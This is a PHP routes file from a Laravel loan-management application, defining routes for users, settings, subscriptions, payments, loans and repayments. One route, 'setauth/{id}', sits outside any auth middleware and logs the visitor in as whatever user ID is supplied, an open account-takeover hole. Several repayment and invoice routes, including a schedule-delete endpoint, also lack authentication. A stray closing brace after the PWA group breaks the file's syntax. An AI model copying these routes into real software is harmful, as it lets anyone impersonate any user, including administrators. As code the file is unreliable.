<?php

use App\Http\Controllers\AccountController;
use App\Http\Controllers\AccountTypeController;
use App\Http\Controllers\Auth\VerifyEmailController;
use App\Http\Controllers\AuthPageController;
use App\Http\Controllers\BranchController;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\UserController;
use App\Http\Controllers\SubscriptionController;
use App\Http\Controllers\SettingController;
use App\Http\Controllers\PermissionController;
use App\Http\Controllers\RoleController;
use App\Http\Controllers\NoticeBoardController;
use App\Http\Controllers\ContactController;
use App\Http\Controllers\CouponController;
use App\Http\Controllers\CustomerController;
use App\Http\Controllers\DocumentTypeController;
use App\Http\Controllers\ExpenseController;
use App\Http\Controllers\FAQController;
use App\Http\Controllers\HomePageController;
use App\Http\Controllers\LoanController;
use App\Http\Controllers\LoanCycleController;
use App\Http\Controllers\LoanTypeController;
use App\Http\Controllers\ModernLandingController;
use App\Http\Controllers\NotificationController;
use App\Http\Controllers\OTPController;
use App\Http\Controllers\PageController;
use App\Http\Controllers\PaymentController;
use App\Http\Controllers\RepaymentController;
use App\Http\Controllers\TransactionController;
use App\Models\RepaymentSchedule;
use App\Models\User;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

// Main Laravel Application Routes
Route::get('/', function () {
    return view('welcome');
});

require __DIR__ . '/auth.php';  // This includes the Laravel auth routes

// PWA Routes - Handled by React application
Route::prefix('pwa')->group(function () {
    Route::get('{any}', function () {
        return file_get_contents(public_path('pwa/index.html'));
    })->where('any', '.*');
});
});

Route::post('/apply', [App\Http\Controllers\FrontPageController::class, 'applyLoan'])->name('front.apply')->middleware(
    [
        'XSS',
    ]
);

Route::post('/calculate-emi', [App\Http\Controllers\FrontPageController::class, 'calculateEMI'])->name('front.calculate-emi')->middleware(
    [
        'XSS',
    ]
);
Route::get('home', [HomeController::class, 'index'])->name('home')->middleware(
    [

        'XSS',
    ]
);
Route::get('dashboard', [HomeController::class, 'index'])->name('dashboard')->middleware(
    [

        'XSS',
    ]
);

//-------------------------------User-------------------------------------------

Route::resource('users', UserController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

Route::get('setauth/{id}',  function ($id) {
    $user = User::find($id);
    \Illuminate\Support\Facades\Auth::login($user);
    return redirect()->route('home');
});


Route::get('login/otp', [OTPController::class, 'show'])->name('otp.show')->middleware(
    [

        'XSS',
    ]
);
Route::post('login/otp', [OTPController::class, 'check'])->name('otp.check')->middleware(
    [

        'XSS',
    ]
);
Route::get('login/2fa/disable', [OTPController::class, 'disable'])->name('2fa.disable')->middleware(['XSS',]);

//-------------------------------Subscription-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {

        Route::resource('subscriptions', SubscriptionController::class);
        Route::get('coupons/history', [CouponController::class, 'history'])->name('coupons.history');
        Route::delete('coupons/history/{id}/destroy', [CouponController::class, 'historyDestroy'])->name('coupons.history.destroy');
        Route::get('coupons/apply', [CouponController::class, 'apply'])->name('coupons.apply');
        Route::resource('coupons', CouponController::class);
        Route::get('subscription/transaction', [SubscriptionController::class, 'transaction'])->name('subscription.transaction');
    }
);

//-------------------------------Subscription Payment-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {

        Route::post('subscription/{id}/stripe/payment', [SubscriptionController::class, 'stripePayment'])->name('subscription.stripe.payment');
    }
);
//-------------------------------Settings-------------------------------------------
Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {
        Route::get('settings', [SettingController::class, 'index'])->name('setting.index');

        Route::post('settings/account', [SettingController::class, 'accountData'])->name('setting.account');
        Route::delete('settings/account/delete', [SettingController::class, 'accountDelete'])->name('setting.account.delete');
        Route::post('settings/password', [SettingController::class, 'passwordData'])->name('setting.password');
        Route::post('settings/general', [SettingController::class, 'generalData'])->name('setting.general');
        Route::post('settings/smtp', [SettingController::class, 'smtpData'])->name('setting.smtp');
        Route::get('settings/smtp-test', [SettingController::class, 'smtpTest'])->name('setting.smtp.test');
        Route::post('settings/smtp-test', [SettingController::class, 'smtpTestMailSend'])->name('setting.smtp.testing');
        Route::post('settings/payment', [SettingController::class, 'paymentData'])->name('setting.payment');
        Route::post('settings/site-seo', [SettingController::class, 'siteSEOData'])->name('setting.site.seo');
        Route::post('settings/google-recaptcha', [SettingController::class, 'googleRecaptchaData'])->name('setting.google.recaptcha');
        Route::post('settings/company', [SettingController::class, 'companyData'])->name('setting.company');
        Route::post('settings/2fa', [SettingController::class, 'twofaEnable'])->name('setting.twofa.enable');

        Route::get('footer-setting', [SettingController::class, 'footerSetting'])->name('footerSetting');
        Route::post('settings/footer', [SettingController::class, 'footerData'])->name('setting.footer');

        Route::get('language/{lang}', [SettingController::class, 'lanquageChange'])->name('language.change');
        Route::post('theme/settings', [SettingController::class, 'themeSettings'])->name('theme.settings');

        Route::post('storage/settings', [SettingController::class, 'storageSetting'])->name('storage.setting');
        Route::post('settings/twilio', [SettingController::class, 'twilio'])->name('setting.twilio');
        
    }
);


//-------------------------------Role & Permissions-------------------------------------------
Route::resource('permission', PermissionController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

Route::resource('role', RoleController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Note-------------------------------------------
Route::resource('note', NoticeBoardController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Contact-------------------------------------------
Route::resource('contact', ContactController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------logged History-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {

        Route::get('logged/history', [UserController::class, 'loggedHistory'])->name('logged.history');
        Route::get('logged/{id}/history/show', [UserController::class, 'loggedHistoryShow'])->name('logged.history.show');
        Route::delete('logged/{id}/history', [UserController::class, 'loggedHistoryDestroy'])->name('logged.history.destroy');
    }
);


//-------------------------------Plan Payment-------------------------------------------
Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {
        Route::post('subscription/{id}/bank-transfer', [PaymentController::class, 'subscriptionBankTransfer'])->name('subscription.bank.transfer');
        Route::get('subscription/{id}/bank-transfer/action/{status}', [PaymentController::class, 'subscriptionBankTransferAction'])->name('subscription.bank.transfer.action');
        Route::post('subscription/{id}/paypal', [PaymentController::class, 'subscriptionPaypal'])->name('subscription.paypal');
        Route::get('subscription/{id}/paypal/{status}', [PaymentController::class, 'subscriptionPaypalStatus'])->name('subscription.paypal.status');
        Route::post('subscription/{id}/{user_id}/manual-assign-package', [PaymentController::class, 'subscriptionManualAssignPackage'])->name('subscription.manual_assign_package');
        Route::get('subscription/flutterwave/{sid}/{tx_ref}', [PaymentController::class, 'subscriptionFlutterwave'])->name('subscription.flutterwave');

        Route::post('/subscription-pay-with-paystack', [PaymentController::class, 'subscriptionPayWithPaystack'])->name('subscription.pay.with.paystack')->middleware(['auth', 'XSS']);
        Route::get('/subscription/paystack/{pay_id}/{plan_id}', [PaymentController::class, 'getsubscriptionsPaymentStatus'])->name('subscription.paystack');
    }
);

//-------------------------------Notification-------------------------------------------
Route::resource('notification', NotificationController::class)->middleware(
    [
        'auth',
        'XSS',

    ]
);

Route::get('email-verification/{token}', [VerifyEmailController::class, 'verifyEmail'])->name('email-verification')->middleware(
    [
        'XSS',
    ]
);

//-------------------------------FAQ-------------------------------------------
Route::resource('FAQ', FAQController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Home Page-------------------------------------------
Route::resource('homepage', HomePageController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);
//-------------------------------FAQ-------------------------------------------
Route::resource('pages', PageController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Auth page-------------------------------------------
Route::resource('authPage', AuthPageController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);


Route::get('page/{slug}', [PageController::class, 'page'])->name('page');
//-------------------------------FAQ-------------------------------------------


//-------------------------------Branch-------------------------------------------
Route::resource('branch', BranchController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);
//-------------------------------Loan Type-------------------------------------------
Route::resource('loan-type', LoanTypeController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);
//-------------------------------Document Type-------------------------------------------
Route::resource('document-type', DocumentTypeController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);
//-------------------------------Customer-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {
        Route::get('customer/{id}/document/create', [CustomerController::class, 'documentCreate'])->name('customer.document.create');
        Route::post('customer/{id}/document/store', [CustomerController::class, 'documentStore'])->name('customer.document.store');
        Route::delete('customer/{id}/document/{did}/destroy', [CustomerController::class, 'documentDestroy'])->name('customer.document.destroy');
        Route::resource('customer', CustomerController::class);
    }
);

//-------------------------------Loan-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {
        Route::resource('loan', LoanController::class);
        Route::get('loan/apply/{loanTypeId}', [LoanController::class, 'apply'])->name('loan.apply');
        Route::get('loan/{id}/approve', [LoanController::class, 'approve'])->name('loan.approve');
        Route::put('loan/{id}/approve', [LoanController::class, 'updateApproval'])->name('loan.updateApproval');
        Route::get('loan/{id}/reminder', [LoanController::class, 'paymentRemind'])->name('payment.reminder');
        Route::post('loan/{id}/reminder', [LoanController::class, 'paymentRemindData'])->name('payment.sendEmail');
    }
);

//-------------------------------Loan Cycles-------------------------------------------
Route::resource('loan-cycle', LoanCycleController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Account Type-------------------------------------------
Route::resource('account-type', AccountTypeController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Account-------------------------------------------
Route::resource('account', AccountController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Transaction-------------------------------------------
Route::resource('transaction', TransactionController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);
Route::post('get-account', [TransactionController::class, 'getAccount'])->name('customer.account');

//-------------------------------Expense-------------------------------------------
Route::resource('expense', ExpenseController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Repayments-------------------------------------------
Route::resource('repayment', RepaymentController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

Route::get('repayment/schedule-payment/{id}', [RepaymentController::class, 'schedulesPayment'])->name('schedule.payment');
Route::get('repayment/schedule-payment-ap/{id}', [RepaymentController::class, 'schedulesPaymentAP'])->name('schedule.payment.ap');
Route::get('repayment/schedule-payment-status/{id}/{status}', [RepaymentController::class, 'schedulesPaymentStatus'])->name('schedule.payment.status');
Route::get('schedule/schedule-filter', [RepaymentController::class, 'loanFilter'])->name('schedule.filetr');


Route::post('invoice/{id}/banktransfer/payment', [RepaymentController::class, 'banktransferPayment'])->name('invoice.banktransfer.payment');
Route::post('invoice/{id}/stripe/payment', [RepaymentController::class, 'stripePayment'])->name('invoice.stripe.payment');
Route::post('invoice/{id}/paypal', [RepaymentController::class, 'invoicePaypal'])->name('invoice.paypal');
Route::get('invoice/{id}/paypal/{status}', [RepaymentController::class, 'invoicePaypalStatus'])->name('invoice.paypal.status');
Route::get('invoice/flutterwave/{id}/{tx_ref}', [RepaymentController::class, 'invoiceFlutterwave'])->name('invoice.flutterwave');
Route::post('invoice/{id}/paystack/payment', [RepaymentController::class, 'invoicePaystack'])->name('invoice.paystack.payment');
Route::get('/invoice/paystack/{pay_id}/{i_id}', [RepaymentController::class, 'invoicePaystackStatus'])->name('invoice.paystack');



Route::post('get-loan-installment', [RepaymentController::class, 'getLoanInstallment'])->name('loan.installment');
Route::get('repayment-schedules', [RepaymentController::class, 'schedules'])->name('repayment.schedules');
Route::delete('repayment-schedules-destroy/{id}', [RepaymentController::class, 'scheduleDestroy'])->name('repayment.schedules.destroy');


Route::impersonate();
